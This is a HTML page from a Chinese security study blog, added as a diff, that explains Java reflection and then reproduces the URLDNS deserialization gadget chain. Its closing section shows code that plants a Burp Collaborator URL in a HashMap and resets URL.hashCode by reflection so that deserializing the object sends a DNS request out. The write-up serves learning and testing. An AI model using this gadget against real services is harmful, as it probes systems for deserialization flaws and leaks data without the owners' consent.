@@ -1,0 +1,659 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/douni.jpg">
+  <link rel="icon" href="/img/douni.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="URLDNS链的调试及反射反射的各种我们首先编写一个Person类，分别设置public和private类型的属性和方法，代码如下： 123456789101112131415161718192021222324252627282930import java.io.IOException;import java.io.ObjectInputStream;import java.io.Seriali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="URLDNS">
+<meta property="og:url" content="http://example.com/2024/03/21/URLDNS/index.html">
+<meta property="og:site_name" content="fault&#96;s blog">
+<meta property="og:description" content="URLDNS链的调试及反射反射的各种我们首先编写一个Person类，分别设置public和private类型的属性和方法，代码如下： 123456789101112131415161718192021222324252627282930import java.io.IOException;import java.io.ObjectInputStream;import java.io.Seriali">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\24440\AppData\Roaming\Typora\typora-user-images\image-20231029203521937.png">
+<meta property="og:image" content="c:\Users\24440\AppData\Roaming\Typora\typora-user-images\image-20231029211126905.png">
+<meta property="article:published_time" content="2024-03-21T05:06:45.853Z">
+<meta property="article:modified_time" content="2024-03-21T05:05:23.108Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:\Users\24440\AppData\Roaming\Typora\typora-user-images\image-20231029203521937.png">
+  
+  
+  
+  <title>URLDNS - fault`s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/dandan/iconfont.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fault`s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="URLDNS"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-21 13:06" pubdate>
+          2024年3月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">URLDNS</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="URLDNS链的调试及反射"><a href="#URLDNS链的调试及反射" class="headerlink" title="URLDNS链的调试及反射"></a>URLDNS链的调试及反射</h1><h2 id="反射的各种"><a href="#反射的各种" class="headerlink" title="反射的各种"></a>反射的各种</h2><p>我们首先编写一个Person类，分别设置public和private类型的属性和方法，代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br><span class="hljs-comment">//    public transient String name;有这个“transient”标识的成员变量不参与序列化</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name ,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.age=age;<br>        <span class="hljs-built_in">this</span>.name=name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&quot;\&#x27;&quot;</span> +<br>                <span class="hljs-string">&quot;,age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">action</span><span class="hljs-params">(String act)</span>&#123;<br>        System.out.println(act);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>那么想必我们最想做的就是通过反射去动态的改变这个类中的各个属性或者动态的调用方法吧，那么我们就需要用到反射去解决，让我们编写一个ReflectionTest.java来实现我们想做的事吧</p>
+<p>我们第一步是想改变Person类的各个属性，例如public的name以及private的age，那么我们首先是需要获取Person类的实例化对象的，否则这个类还未加载，我们就不可能通过反射去动态的修改这个类里面的东西了，在这里，我们有可能会用到两个函数，getConstructor和newInstance，示例代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    	<span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//获取到类的实例化对象</span><br>    	<span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<span class="hljs-comment">//获取类的原型类</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对于这个Class这里我引用了廖雪峰网站的一些解释：</p>
+<p><img src="C:\Users\24440\AppData\Roaming\Typora\typora-user-images\image-20231029203521937.png" srcset="/img/loading.gif" lazyload alt="image-20231029203521937"></p>
+<p>因为我们将clazz接收了Person这个类在JVM中加载的Class实例，所以clazz中保存着Person类的所有信息，而因为我们有Person这个类的实例变量，所以我们采用第二种方法去获取它的Class实例，就这样，我们获取到了Person类的所有信息并将其保存在实例clazz中，之后我们就可以通过更改clazz去修改在这个类中加载的Person类中的信息。</p>
+<p>在我们获取到了Person类中的所有信息后，我们如果需要对它进行修改(这个Person类是我们自己写的，所以其中的内容对我们来说是白盒，但如果我们只知道Person这个类名，那么我们应该如何获取它里面的一些信息呢)，我们首先需要使用一些方法来获得它的字段(属性)，这里会用到这几个方法：getField、getDeclaredField、getDeclaredFields、getFields前后两对的差距只是后者的返回值是数组，里面包含这所有字段的信息，而前者返回值则是单个的字段，所以前者是需要指明具体获取哪个字段的，如果是在黑盒的情况下，首先推荐使用后面两对去把它的所有字段全部读出来，再看看有没有能用到的，再使用前者去获取，那么是否有Declared有什么区别呢？这很容易可以知道，前者是获取public字段时使用的，而后者是在获取private字段时使用的，而后者通常会与setAccessible(true)一同使用，否则便会报错</p>
+<p>于是我们将代码完善至这样</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    	<span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//获取到类的实例化对象</span><br>    	<span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<span class="hljs-comment">//获取类的原型类</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> clazz.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;fault&quot;</span>,<span class="hljs-number">20</span>);<br>        Field[] personFields= clazz.getDeclaredFields();<span class="hljs-comment">//out:public java.lang.String Person.name private int Person.age:会打印出包括private中的属性</span><br>        Field[] personFields= clazz.getFields();<span class="hljs-comment">//out : public java.lang.String Person.name：不会打印private属性</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> clazz.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField_age</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        nameField_age.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//        for(Field f : personFields)&#123;</span><br><span class="hljs-comment">//            System.out.println(f);</span><br><span class="hljs-comment">//        &#125;</span><br>        nameField.set(p,<span class="hljs-string">&quot;java&quot;</span>);<br>        nameField_age.set(p,<span class="hljs-number">114514</span>);<br>        System.out.println(nameField);<br>        System.out.println(p);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//额对自己莫名其妙多出来的</span><br><span class="hljs-comment">//        Constructor personconstructor = clazz.getConstructor(String.class, int.class);</span><br><span class="hljs-comment">//        Person p = (Person) personconstructor.newInstance(&quot;fault&quot;,20);</span><br><span class="hljs-comment">//这两行代码做一个解释，如果我们对getConstructor这个方法进行跟进，会发现它的参数要求如下：</span><br><span class="hljs-comment">//getConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="hljs-comment">//一个泛型的class以及它的参数类型，也就是所谓的函数签名(这个在重载时就已经会知道了)</span><br><span class="hljs-comment">//因为我们Person中有四个方法，但他们的区别是函数签名，那我们需要在getConstructor中输入参数类型就可以了，接下来再利用newInstance去获取实例对象就可以实现了</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来我们如果想动态获取并调用它的方法，我们则会需要这些函数：getMethod，getMethods，getDeclaredMethod，getDeclaredMethods，它们的区别可以参考上一个getField它们之间的区别。</p>
+<p>于是我们将代码完整的写出来是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.accessibility.Accessible;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br>        <span class="hljs-comment">//获取到类的原型</span><br><br><br>        <span class="hljs-comment">//获取实例化对象</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> clazz.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;fault&quot;</span>,<span class="hljs-number">20</span>);<br><span class="hljs-comment">//        System.out.println(p);</span><br>        <span class="hljs-comment">//获取类里面属性</span><br><span class="hljs-comment">//        Field[] personFields= clazz.getDeclaredFields();//out:public java.lang.String Person.name private int Person.age:会打印出包括private中的属性</span><br><span class="hljs-comment">//        Field[] personFields= clazz.getFields();//out : public java.lang.String Person.name：不会打印private属性</span><br><span class="hljs-comment">//        personFields.setAccessible(true); //</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> clazz.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField_age</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        nameField_age.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//        for(Field f : personFields)&#123;</span><br><span class="hljs-comment">//            System.out.println(f);</span><br><span class="hljs-comment">//        &#125;</span><br>        nameField.set(p,<span class="hljs-string">&quot;java&quot;</span>);<br>        nameField_age.set(p,<span class="hljs-number">114514</span>);<br><span class="hljs-comment">//        System.out.println(nameField);</span><br><span class="hljs-comment">//        System.out.println(p);</span><br><br>        <span class="hljs-comment">//调用类里面的方法</span><br>            <span class="hljs-comment">//使用数组获取全部方法</span><br><span class="hljs-comment">//        Method[] personMethods = clazz.getMethods();</span><br><span class="hljs-comment">//        for(Method f : personMethods)&#123;</span><br><span class="hljs-comment">//            System.out.println(f);</span><br><span class="hljs-comment">//        &#125;</span><br>            <span class="hljs-comment">//使用特定名字获取特定方法且公有</span><br><span class="hljs-comment">//        Method personMethod = clazz.getMethod(&quot;action&quot;,String.class);//getMethod的参数类型是getMethod(String name, Class&lt;?&gt;... parameterTypes)，所以需要声明参数类型</span><br><span class="hljs-comment">//        personMethod.invoke(p,&quot;fault&quot;);</span><br>            <span class="hljs-comment">//使用特定名字获取特定方法且私有</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">personPrivateMethod</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;action&quot;</span>,String.class);<br>        personPrivateMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        personPrivateMethod.invoke(p,<span class="hljs-string">&quot;fault&quot;</span>);<br><span class="hljs-comment">//        System.out.println(personMethod);</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>接下来我们回到正题，URLDNS上，其实这个链子的原理很简单，就是在URL类中的hashcode方法中的</p>
+<p><img src="C:\Users\24440\AppData\Roaming\Typora\typora-user-images\image-20231029211126905.png" srcset="/img/loading.gif" lazyload alt="image-20231029211126905"></p>
+<p>handler.hashcode方法中有getHostAddress方法，它会触发DNS解析，于是我们可以利用这个解析，将信息外带。所以我们的目的就是触发这个方法，但前提是在反序列化的时候才触发，而非在序列化时就触发，在上图中我们可以看到，触发它的方式是hashcode&#x3D;&#x3D;-1，如果我们单纯的使用如下代码：</p>
+<p>在这里我们使用burpsuite进行模拟监听</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">HashMap</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">URL</span><span class="hljs-operator">,</span><span class="hljs-built_in">Integer</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-variable">HashMap</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">URL</span><span class="hljs-operator">,</span> <span class="hljs-built_in">Integer</span><span class="hljs-operator">&gt;</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;</span><br><span class="hljs-variable">hashMap</span><span class="hljs-operator">.</span><span class="hljs-variable">put</span><span class="hljs-punctuation">(</span><span class="hljs-variable">new</span> <span class="hljs-built_in">URL</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;http://z558pnxlaeaq562m58owyyob42atyi.oastify.com&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-operator">,</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;</span><br></code></pre></td></tr></table></figure>
+
+<p>这样如果我们在序列化时使用burpsuite监听，也会发现在序列化时就有了DNS请求，这样违背的我们的初衷，更会在一定程度上为我们造成干扰，于是我们寻找原因，发现是因为我们在hashMap方法里发现了hashCode方法，它也会进行DNS解析，所以我们一来不可以这样写，而来我们需要在put方法之前将hashcode改为非-1，因为我们如果继续跟进，会发现hashcode在初始化时就被初始化为了-1，我们如果要强制不让它进入hashcode方法，那我们就需要通过反射去动态的修改它的hashcode值，但因为它是private属性，我们对它的处理需要配合setAccessible和Declaired去获取和改变，代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">      <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://z558pnxlaeaq562m58owyyob42atyi.oastify.com&quot;</span>); <span class="hljs-comment">//BurpSuite生成的监听DNS链接       </span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> url.getClass();<br>      <span class="hljs-type">Field</span> <span class="hljs-variable">urlhashcode</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<span class="hljs-comment">//获取到hashcode值并赋值给urlhashcode这个变量</span><br>      urlhashcode.setAccessible(<span class="hljs-literal">true</span>);<br>      urlhashcode.set(url,<span class="hljs-number">0</span>);<span class="hljs-comment">//将它设置为0(即非-1值)</span><br>      hashMap.put(url,<span class="hljs-number">1</span>);<span class="hljs-comment">//进行调用</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来我们需要将hashcode再次设置为-1，这样我们在反序列化时，hashcode为-1，于是可以进入hashCode方法从而触发DNS解析），经过BurpSuite验证为真，于是我们复现完了URLDNS链</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>URLDNS</div>
+      <div>http://example.com/2024/03/21/URLDNS/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/21/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="动态代理">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">动态代理</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/21/Tomcat%E6%BA%90%E7%A0%81%E5%88%9D%E8%AF%86%EF%BC%88tomcat%E6%B5%81%E7%A8%8B%EF%BC%89/" title="Tomcat源码初识（tomcat流程）">
+                        <span class="hidden-mobile">Tomcat源码初识（tomcat流程）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
